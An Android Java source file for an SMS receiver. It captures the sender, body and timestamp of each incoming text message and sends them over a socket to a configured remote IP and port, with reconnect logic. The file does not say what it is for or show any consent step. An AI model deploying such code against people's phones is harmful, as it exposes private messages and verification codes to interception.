package com.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.RequiresApi;
import android.telephony.SmsMessage;

import me.pqpo.librarylog4a.Log4a;

public class SmsReceiver extends BroadcastReceiver {
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onReceive(Context context, Intent intent) {

        if (fun.receivesms && fun.isrun) {
            Log4a.e("SmsReceiver", "onReceive--------");
            try {
                //接受intent对象当中的数据
                Bundle bundle = intent.getExtras();
                //Bundle对象当中有个属性名为pdus，这个属性值是一个Object数组
                Object[] myOBJpdus = (Object[]) bundle.get("pdus");
                //创建一个SmsMessage类型的数组
                SmsMessage[] messages = new SmsMessage[myOBJpdus.length];
                for (int i = 0; i < myOBJpdus.length; i++) {
                    try {
                        //使用Object数组当中的对象创建SmsMessage对象
                        messages[i] = SmsMessage.createFromPdu((byte[]) myOBJpdus[i]);
                        //调用对象相应方法，获取相应内容
                        String number = messages[i].getOriginatingAddress();
                        String body = messages[i].getDisplayMessageBody();
                        String date = String.valueOf(messages[i].getTimestampMillis());
                        String id = "9999";
                        if (fun.socket != null) {
                            if (fun.socket.isconn() && !fun.socket.isclose()) {
                                String msgObj = "address:" + number + "@body:" + body + "@date:" + date + "@id:" + id + "@\n";
                                fun.isrun = true;
                                fun.smscount++;
                                sendth send = new sendth(msgObj);
                                send.start();
                                Thread.sleep(1000);
                            } else {
                                Log4a.e("SmsReceiver", "disconn");
                                reconn();
                                break;

                            }
                        } else {
                            Log4a.e("SmsReceiver", "not netweb");
                            reconn();
                            break;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        Log4a.e("SmsReceiver - Exception",e.getMessage());
                        reconn();
                        break;
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                Log4a.e("SmsReceiver - Exception",e.getMessage());
                reconn();

            }
        }else{
            Log4a.e("SmsReceiver", "receive not run");
        }


    }

    private void reconn() {
        fun.receivesms = false;
        if(fun.socket!=null)
        fun.socket.close2();
        if (!fun.IP.equals("") && !fun.Port.equals("")) {
            fun.socket = new Socketth(fun.IP, Integer.valueOf(fun.Port));
            fun.socket.start();
        }

    }

    private class sendth extends Thread {
        public sendth(String data) {
            setSdata(data);
        }

        public String getSdata() {
            return sdata;
        }

        public void setSdata(String sdata) {
            this.sdata = sdata;
        }

        private String sdata;

        @Override
        public void run() {
            super.run();
            fun.socket.send(sdata);
        }
    }

}
